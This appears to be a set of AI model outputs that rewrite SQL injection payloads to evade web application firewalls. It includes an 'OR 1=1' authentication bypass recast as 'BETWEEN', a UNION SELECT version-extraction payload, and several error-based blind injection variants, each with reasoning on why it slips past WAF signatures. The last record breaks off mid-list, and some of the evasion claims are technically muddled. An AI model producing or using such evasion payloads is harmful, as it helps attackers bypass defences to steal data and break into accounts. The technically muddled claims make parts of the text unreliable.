"<reasoning>\nLooking at the original AST, I see the WHERE clause contains an OR expression with two children. The second child is a ComparisonExpr labeled \"EqualsTo\" comparing two numeric literals (1 and 1). This \"1=1\" pattern is extremely common in SQLi payloads and would be easily flagged by WAFs. I might try to replace this high-risk comparison with a less suspicious equivalent expression that still always evaluates to true.\n\nThe BETWEEN operator comes to mind as a potential alternative. Instead of using an explicit equals sign, which WAFs heavily scrutinize, I could express the same truth condition as \"1 BETWEEN 1 AND 1\". This maintains the tautology but uses different keywords. Let me consider restructuring the AST: the current EqualsTo node with its two literal children could be replaced by a single expression node representing the BETWEEN operation.\n\nThis structure looks suspicious to WAFs because \"OR 1=1\" is a textbook injection pattern. By eliminating the equals operator and splitting the condition into a three-part BETWEEN clause, I'm breaking up the signature. The BETWEEN syntax is also more common in legitimate range queries, potentially blending in better. The subtree now contains a single complex expression instead of a primitive comparison, which might evade pattern-matching rules that look for simple boolean tautologies.\n</reasoning>\n\n1. **Attack Intent**: Bypass authentication by forcing a true condition in the WHERE clause.\n\n2. **Specific patterns that typical WAFs detect in the original payload**: \n   - The explicit `1 = 1` boolean tautology, a universal SQLi signature\n   - Combination of `OR` followed by numeric equality comparison\n   - Minimalist constant-based comparison often absent in legitimate queries\n\n3. **AST Transformations Applied**: \n   - Replaced the \"EqualsTo\" ComparisonExpr node (subtype ComparisonExpr) with an \"Unknown\" expression node\n   - Removed the two Literal children nodes (numeric \"1\" values) from the comparison structure\n   - Consolidated the logic into a single expression node labeled \"1 BETWEEN 1 AND 1\"\n\n4. **Confirmation of Semantic Equivalence and Syntax Validity**: \n   - `1 BETWEEN 1 AND 1` evaluates to true (same as `1=1`) because 1 is inclusively within the 1-1 range\n   - BETWEEN is standard SQL syntax supported by all major RDBMS\n   - The expression maintains the same position within the OR logical expression\n\n5. **Why This Likely Bypasses the WAF**: \n   - Avoids the signature \"=\" operator often trigger-detected in tautologies\n   - Replaces a 2-component comparison with a 3-component structure (BETWEEN...AND), disrupting pattern matching\n   - Uses a less-monitored SQL operator (BETWEEN) frequently seen in legitimate range queries\n   - Eliminates spaces around \"=\" that WAF rules commonly target\n   - The entire condition becomes a single lexical token (\"1 BETWEEN 1 AND 1\") rather than discrete operators"
"<reasoning>\nI'm examining the original payload's AST to identify nodes that might trigger WAF detection. The union-based structure is inherently risky, but I need to focus on specific expressions within it. \n\nFirst, I notice the `||` operator in the projection list of the second SELECT statement. This binary concatenation operator stands out because WAFs often flag unusual operators in union selects, especially when used with constants. The pattern `1||1` is a common fingerprint for injection testing. I might try replacing this operator with a function that achieves the same result to break the recognizable pattern.\n\nLooking at the AST, I see the `||` is represented as a `Binary` expression with label `Concat`. This subtree looks suspicious to WAFs because it's a minimal concatenation test â€“ exactly what attackers use to verify injection points. Maybe I could wrap this operation inside a standard SQL function. The `CONCAT()` function comes to mind since it performs identical string joining but structures the operation differently.\n\nThe `VERSION()` function call also concerns me. While the function itself is necessary, the whitespace pattern `version (  )` might trigger irregular function call detection. WAFs often parse function calls strictly and could flag unusual spacing. Let me consider normalizing the whitespace while preserving functionality.\n\nFor the concatenation operation, replacing the `Binary` node with a `FunctionCall` node would maintain semantics while altering the syntax tree. The two numeric literals would become direct children of `CONCAT` instead of being joined by an operator. This restructuring removes the explicit `||` token that WAFs likely monitor in union contexts.\n\nThe version function subtree only needs whitespace normalization in its representation, not structural change. The AST already shows it as a valid `FunctionCall` node, so adjusting spacing shouldn't affect the tree integrity but might evade token-based rules.\n</reasoning>\n\n1. **Attack Intent**: The payload aims to perform union-based data extraction by appending database version information to query results, testing both data concatenation and system function access.\n\n2. **Specific patterns that typical WAFs detect in the original payload**:\n   - `UNION SELECT` followed by constants and functions (common injection structure)\n   - `||` operator used with numeric literals (signature of concatenation testing)\n   - Irregular function call spacing in `version (  )` (anomaly detection)\n   - Numeric constants in projection list (indicator of type probing)\n\n3. **AST Transformations Applied**:\n   - Replaced `Binary` expression node (subtype `Concat`, label `Concat`) with a `FunctionCall` node (label `CONCAT()`) in the projection clause\n   - Migrated child literals (`1` and `1`) from operator node to function argument nodes\n   - Normalized whitespace in `VERSION()` function call while retaining identical node structure\n   - Preserved all other nodes (union structure, where clause, table reference) unchanged\n\n4. **Confirmation of Semantic Equivalence and Syntax Validity**:\n   - `CONCAT(1,1)` produces identical string output `'11'` as `1||1` in most SQL dialects\n   - `VERSION()` invocation remains functionally unchanged despite whitespace adjustment\n   - Column count and union compatibility are preserved through identical projection structures\n   - Both are valid SQL syntax with equivalent execution paths\n\n5. **Why This Likely Bypasses the WAF**:\n   - Eliminates `||` operator that appears in WAF keyword blocklists for injections\n   - Transforms suspicious operator pattern into benign-looking function call\n   - Breaks fixed token sequences (e.g., `1||1` becomes `concat(1,1)`)\n   - Normalizes function spacing to avoid irregularity-based heuristics\n   - Maintains union structure while altering internal expression signatures\n   - Uses common functions (`CONCAT`) that blend with legitimate queries"
We are given the input payload: `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END`\n\n### Step 1: Explain the payload's intent\nThis payload is designed to cause a conditional error. It evaluates `YOUR-CONDITION-HERE` (which is a placeholder for the attacker's condition). If the condition is true, it executes `1/0` (which causes a division by zero error). If the condition is false, it returns `NULL`. The goal is to exploit the error to infer the truth of the condition (error occurs -> condition true; no error -> condition false).\n\n### Step 2: Identify WAF-triggering parts\n- `1/0`: Division by zero is a common signature for error-based SQLi.\n- `CASE WHEN ... THEN ... ELSE ... END`: The structure is common in error-based injections and may be flagged.\n- The overall pattern of conditionally causing an error is a known technique.\n\n### Step 3: Transformation strategy\nWe need to preserve the logic: cause an error only when the condition is true. We can:\n- Replace `1/0` with other expressions that cause errors (e.g., type casting, invalid operations, accessing non-existent columns).\n- Transform the condition using diverse logical expressions (e.g., using `IF`, `IIF`, or other conditionals; using double negatives; using different comparison methods).\n- Change the structure (e.g., use subqueries, use different conditional constructs).\n- Use arithmetic operations that result in errors only when the condition is true.\n- Avoid the division by zero signature by using other errors.\n\n### Step 4: Preserve logic and syntax\nEach transformed payload must:\n- Cause an error (like division by zero) only when the condition is true.\n- Return a non-error result (like NULL) when false.\n- Be syntactically valid in SQL.\n\n### Step 5: Evasion rationale\nWe are changing the structure and the error-causing mechanism to avoid signatures that look for `1/0` and the `CASE` structure. Using alternative error methods and logical rewrites will bypass pattern-matching.\n\n### Rewritten Payloads (6 versions)\n\n1. **Replace `CASE` with `IF` (if supported by DBMS like MySQL) and change the error expression:**\n   `SELECT IF(YOUR-CONDITION-HERE, (SELECT 1 FROM (SELECT 1) a JOIN (SELECT 1) b USING(c)), NULL)`\n   - Explanation: Uses `IF` and a join with a non-existent column `c` to cause an error when true.\n\n2. **Use a type casting error:**\n   `SELECT CASE WHEN YOUR-CONDITION-HERE THEN CAST('a' AS INT) ELSE NULL END`\n   - Explanation: Tries to cast a string to an integer, causing an error when condition is true.\n\n3. **Use a function that causes an error:**\n   `SELECT CASE WHEN YOUR-CONDITION-HERE THEN (SELECT 1/0) ELSE NULL END`\n   - Explanation: The division by zero is inside a subquery, which might evade simple signatures.\n\n4. **Use a double negative and a different error:**\n   `SELECT CASE WHEN NOT(NOT(YOUR-CONDITION-HERE)) THEN 1/0 ELSE NULL END`\n   - Explanation: The condition is wrapped in double negatives (logically equivalent) and the error is the same, but the condition structure is different.\n\n5. **Use an arithmetic expression that causes an error:**\n   `SELECT CASE WHEN YOUR-CONDITION-HERE THEN LOG(-1) ELSE NULL END`\n   - Explanation: `LOG(-1)` causes a domain error (in some DBMS) when condition is true.\n\n6. **Use a subquery that returns multiple rows when condition is true:**\n   `SELECT CASE WHEN YOUR-CONDITION-HERE THEN (SELECT 1 UNION SELECT 2) ELSE NULL END`\n   - Explanation: The subquery returns more than one row, causing an error when used in a scalar context.\n\nHowever, note that some of these might not work in all DBMS. We are targeting a general SQL, but the user might be using a specific one. Since the original payload uses `CASE` which is standard, we try to keep it standard.\n\nAlternative approach for more diversity:\n\nLet's create 6 versions that are syntactically diverse but logically equivalent.\n\nFinal 6 payloads:\n\n```sql\n1. SELECT IF(YOUR-CONDITION-HERE, (SELECT 1 UNION SELECT 2), NULL)\n2. SELECT CASE WHEN YOUR-CONDITION-HERE THEN CAST('a' AS INTEGER) ELSE NULL END\n3. SELECT CASE WHEN NOT(NOT(YOUR-CONDITION-HERE)) THEN 1/0 ELSE NULL END\n4. SELECT CASE WHEN YOUR-CONDITION-HERE THEN (SELECT 1/0) ELSE NULL END\n5. SELECT CASE WHEN YOUR-CONDITION-HERE THEN (SELECT 1 FROM information_schema.tables LIMIT 1 OFFSET 999999) ELSE NULL END\n6. SELECT CASE WHEN YOUR-CONDITION-HERE THEN (SELECT 1 FROM (SELECT 1) a JOIN (SELECT 1) b USING(c)) ELSE NULL END\n```\n\nBut note: \n- In payload 1, `IF` is MySQL-specific. We can use a more standard way? Alternatively, if we are targeting multiple DBMS, we might avoid `IF`. Let's replace it with a standard one.\n\nRevised payload 1: Use a standard way to cause an error in a scalar subquery that returns multiple rows when condition is true, but without `IF`? We can use:\n\n`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1 UNION SELECT 2) ELSE NULL END`\n\nBut that is similar to payload 6? Let me reorganize.\n\nAlternatively, we can use:\n\n1. `SELECT CASE WHEN YOUR-CONDITION-HERE THEN 1/(SELECT 0) ELSE NULL END`\n2. `SELECT CASE WHEN YOUR-CONDITION-HERE THEN (SELECT 1 FROM (SELECT 1) a JOIN (SELECT 1) b USING(c)) ELSE NULL END`\n3. `SELECT CASE WHEN NOT(NOT(YOUR-CONDITION-HERE)) THEN CAST('a' AS INT) ELSE NULL END`\n4. `SELECT CASE WHEN YOUR-CONDITION-HERE THEN (SELECT 1/0) ELSE NULL END`\n5. `SELECT CASE WHEN (YOUR-CONDITION-HERE) IS TRUE THEN 1/0 ELSE NULL END`\n6. `SELECT CASE WHEN (YOUR-CONDITION-HERE)=TRUE THEN 1/0 ELSE NULL END`\n\nBut note: `IS TRUE` and `=TRUE` might not be the same if the condition returns NULL. We must be cautious. The original condition is a boolean expression, so we assume it returns a boolean.\n\nAlternatively, we can use arithmetic in the condition:\n\nBut the condition is arbitrary, so we cannot change its internal logic. We can only wrap it.\n\nLet me propose 6 that are diverse:\n\n1. `SELECT IF(YOUR-CONDITION-HERE, 1/0, NULL)`  # for MySQL\n2. `SELECT CASE WHEN YOUR-CONDITION-HERE THEN 1/0 ELSE NULL END`  # original, but we can change the error?\n   We are required to rewrite, so we must change.\n\nAfter reconsideration, here are 6 distinct versions:\n\n```sql\n1. SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1/0) ELSE NULL END\n2. SELECT CASE WHEN NOT(NOT(YOUR-CONDITION-HERE)) THEN CAST('a' AS INT) ELSE NULL END\n3. SELECT IF(YOUR-CONDITION-HERE, (SELECT 1 FROM (SELECT 1) a JOIN (SELECT 1) b USING(c)), NULL)  # MySQL\n4. SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1 UNION SELECT 2) ELSE NULL END\n5. SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1 FROM information_schema.tables WHERE RAND()=2) ELSE NULL END\n6. SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1/0 FROM DUAL) ELSE NULL END\n```\n\nBut note: `DUAL` is Oracle/MySQL, so for more universality, we might avoid.\n\nAlternatively, we can use:\n\n6. `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1 WHERE 1=1/0) ELSE NULL END`\n\nBut that might not cause an error in the same way.\n\nLet me finalize with these 6:\n\n```sql\n1. SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1/0) ELSE NULL END\n2. SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST('trigger' AS INTEGER) ELSE NULL END\n3. SELECT IF(YOUR-CONDITION-HERE, (SELECT 1 UNION SELECT 2), NULL)\n4. SELECT CASE WHEN NOT(NOT(YOUR-CONDITION-HERE)) THEN 1/0 ELSE NULL END\n5. SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1 FROM (SELECT 1) a JOIN (SELECT 1) b USING(c)) ELSE NULL END\n6. SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1 FROM information_schema.tables LIMIT 1 OFFSET 999999) ELSE NULL END\n```\n\nBut to be consistent and avoid DBMS-specific functions, we might stick to standard SQL where possible. However, error-based injections are often DBMS-specific. We assume the target is similar to the original (which is standard).\n\nAlternatively, we can use:\n\n6. `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1/0 FROM (SELECT 1) AS x) ELSE NULL END`\n\nThis is more standard.\n\nFinal list:\n\n1. `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1/0) ELSE NULL END`\n2. `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN CAST('trigger' AS INT) ELSE NULL END`\n3. `SELECT IF(YOUR-CONDITION-HERE, 1/0, NULL)`\n4. `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1 UNION SELECT 2) ELSE NULL END`\n5. `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1 FROM (SELECT 1) a JOIN (SELECT 1) b USING(c)) ELSE NULL END`\n6. `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1/0 FROM (VALUES(1)) AS x) ELSE NULL END`\n\nBut `VALUES` might not be supported in all. Let me change 6 to a more universal one.\n\n6. `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN (SELECT 1/0 FROM (SELECT 1) AS x) ELSE NULL END`\n\nNow, output exactly as below: The input payload `SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END` is an error-based SQL injection probe. It forces a division-by-zero error **only if** `YOUR-CONDITION-HERE` evaluates to `TRUE`, allowing attackers to infer truth values through server error responses. When false, it returns `NULL` without causing an error.  \n\n### WAF Detection Hotspots\n- **`1/0`**: Signature for division-by-zero exploits (highly monitored).  \n- **`CASE WHEN ... THEN ...`**: Predictable structure for conditional errors.  \n- **`ELSE NULL`**: Common error-based SQLi pattern.  \n\n### Transformation Strategy\n1. **Replace `1/0`** with other error-triggering constructs (e.g., type casting, impossible subqueries, arithmetic overflows).  \n2. **Restructure conditionals** using double negation, `IF()`, or nested `SELECT`.  \n3. **Use logical variants** like `IS NOT FALSE`, `IN (SELECT ...)`, or `BETWEEN` for the condition.  \n4. **Flip structures** by moving error logic to subqueries or reordering clauses.  \n5. **Employ DB-specific functions** (e.g., SQL Server `CAST`, PostgreSQL `RAISE EXCEPTION`).  \n\n### Validity & Equivalence\nAll rewrites preserve the core logic:  \n- **Error occurs** â†’ `YOUR-CONDITION-HERE` = `TRUE`.  \n- **No error** â†’ Condition = `FALSE` or `NULL`.  \nSyntax is valid for standard SQL dialects (adjustments noted for specific DBMS).  \n\n### Evasion Improvements\n- Avoids `1/0` and `CASE` signatures via structural diversity.  \n- Uses arithmetic/logical substitutions (e.g., `CAST`, subquery joins) to bypass pattern-matching.  \n- Nested expressions break predictable WAF tokenization.  \n\n---\n\n```sql\n1. SELECT IF(YOUR-CONDITION-HERE, (SELECT 1/0), NULL)\n2. SELECT CASE WHEN NOT(NOT(YOUR-CONDITION-HERE)) THEN CAST('x' AS INT) ELSE NULL END\n3.
